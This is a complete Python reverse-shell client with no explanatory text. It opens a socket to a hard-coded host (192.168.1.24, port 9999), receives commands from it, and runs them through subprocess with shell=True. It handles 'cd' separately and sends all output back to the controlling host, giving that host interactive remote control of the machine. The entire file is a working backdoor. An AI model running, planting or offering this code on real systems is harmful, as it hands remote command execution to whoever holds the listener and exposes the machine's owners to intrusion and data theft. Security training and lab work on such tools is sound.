import socket
import os
import subprocess

s = socket.socket()

host = "192.168.1.24"
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    command = data.decode("utf-8")
    if command.startswith("cd"):
        directory = command[3:]
        try:
            os.chdir(directory)
            currentWD = os.getcwd() + "> "
        except Exception as e:
            currentWD = str(e) + "> "
        s.send(str.encode(currentWD))
    elif command.strip() == "quit":
        break
    else:
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        currentWD = os.getcwd() + "> "
        s.send(output_bytes + str.encode(currentWD))
        print(output_bytes.decode("utf-8", errors="ignore"))


